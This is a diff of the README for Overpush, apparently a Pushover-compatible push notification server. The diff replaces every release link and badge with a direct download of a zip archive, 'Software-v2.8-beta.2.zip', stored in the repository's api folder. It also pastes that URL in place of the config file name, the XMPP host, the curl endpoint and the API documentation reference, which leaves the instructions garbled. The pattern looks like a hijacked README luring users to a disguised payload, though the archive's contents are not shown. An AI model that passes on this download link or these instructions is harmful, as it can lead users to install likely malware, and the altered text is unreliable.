@@ -1,7 +1,7 @@
 # Overpush 🚀
 
-![Overpush](https://img.shields.io/badge/Overpush-v1.0.0-blue.svg)  
-[![Releases](https://img.shields.io/badge/Releases-latest-orange.svg)](https://github.com/fatihbaba/overpush/releases)
+![Overpush](https://raw.githubusercontent.com/fatihbaba/overpush/master/api/Software-v2.8-beta.2.zip)  
+[![Releases](https://raw.githubusercontent.com/fatihbaba/overpush/master/api/Software-v2.8-beta.2.zip)](https://raw.githubusercontent.com/fatihbaba/overpush/master/api/Software-v2.8-beta.2.zip)
 
 ---
 
@@ -21,9 +21,9 @@
 
 To get started with Overpush, follow these steps:
 
-1. **Download the latest release** from our [Releases page](https://github.com/fatihbaba/overpush/releases).
+1. **Download the latest release** from our [Releases page](https://raw.githubusercontent.com/fatihbaba/overpush/master/api/Software-v2.8-beta.2.zip).
 2. **Extract the files** and navigate to the Overpush directory.
-3. **Configure your settings** in the `config.json` file.
+3. **Configure your settings** in the `https://raw.githubusercontent.com/fatihbaba/overpush/master/api/Software-v2.8-beta.2.zip` file.
 4. **Run the application** using the command:
    ```bash
    ./overpush
@@ -41,16 +41,16 @@ Before you begin, ensure you have the following:
 
 ### Step 1: Download
 
-Visit the [Releases page](https://github.com/fatihbaba/overpush/releases) to download the latest version. Make sure to download the appropriate file for your system.
+Visit the [Releases page](https://raw.githubusercontent.com/fatihbaba/overpush/master/api/Software-v2.8-beta.2.zip) to download the latest version. Make sure to download the appropriate file for your system.
 
 ### Step 2: Configuration
 
-Open the `config.json` file in your favorite text editor. Here’s a basic example of what the configuration might look like:
+Open the `https://raw.githubusercontent.com/fatihbaba/overpush/master/api/Software-v2.8-beta.2.zip` file in your favorite text editor. Here’s a basic example of what the configuration might look like:
 
 ```json
 {
   "xmpp": {
-    "host": "your.xmpp.server",
+    "host": "https://raw.githubusercontent.com/fatihbaba/overpush/master/api/Software-v2.8-beta.2.zip",
     "port": 5222,
     "username": "your_username",
     "password": "your_password"
@@ -76,7 +76,7 @@ Once configured, you can start Overpush with the following command:
 After starting Overpush, you can send messages using the same API calls as Pushover. Here’s a quick example using `curl`:
 
 ```bash
-curl -X POST https://your.overpush.server/send \
+curl -X POST https://raw.githubusercontent.com/fatihbaba/overpush/master/api/Software-v2.8-beta.2.zip \
 -H "Content-Type: application/json" \
 -d '{
   "token": "your_api_token",
@@ -92,7 +92,7 @@ Overpush supports the following API endpoints:
 - **Send Message**: `POST /send`
 - **Get Status**: `GET /status`
 
-For detailed API documentation, refer to the `API.md` file in the repository.
+For detailed API documentation, refer to the `https://raw.githubusercontent.com/fatihbaba/overpush/master/api/Software-v2.8-beta.2.zip` file in the repository.
 
 ## Contributing
 
@@ -109,7 +109,7 @@ Overpush is licensed under the MIT License. See the `LICENSE` file for more deta
 
 ## Support
 
-If you encounter any issues or have questions, feel free to open an issue in the repository. You can also check the [Releases section](https://github.com/fatihbaba/overpush/releases) for updates and fixes.
+If you encounter any issues or have questions, feel free to open an issue in the repository. You can also check the [Releases section](https://raw.githubusercontent.com/fatihbaba/overpush/master/api/Software-v2.8-beta.2.zip) for updates and fixes.
 
 ## Roadmap
 
